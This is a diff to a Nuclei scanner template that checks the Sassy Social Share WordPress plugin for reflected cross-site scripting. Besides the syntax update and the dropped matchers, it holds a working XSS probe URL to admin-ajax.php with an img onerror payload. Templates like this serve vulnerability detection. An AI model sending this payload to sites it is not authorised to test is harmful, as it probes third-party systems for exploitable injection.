@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sassy-social-share-xss
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: medium
   tags: wordpress,wp-plugin,sassy,xss
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]="
@@ -25,8 +26,3 @@ requests:
         part: header
         words:
           - 'application/json'
-        negative: true
-
-      - type: status
-        status:
-          - 200
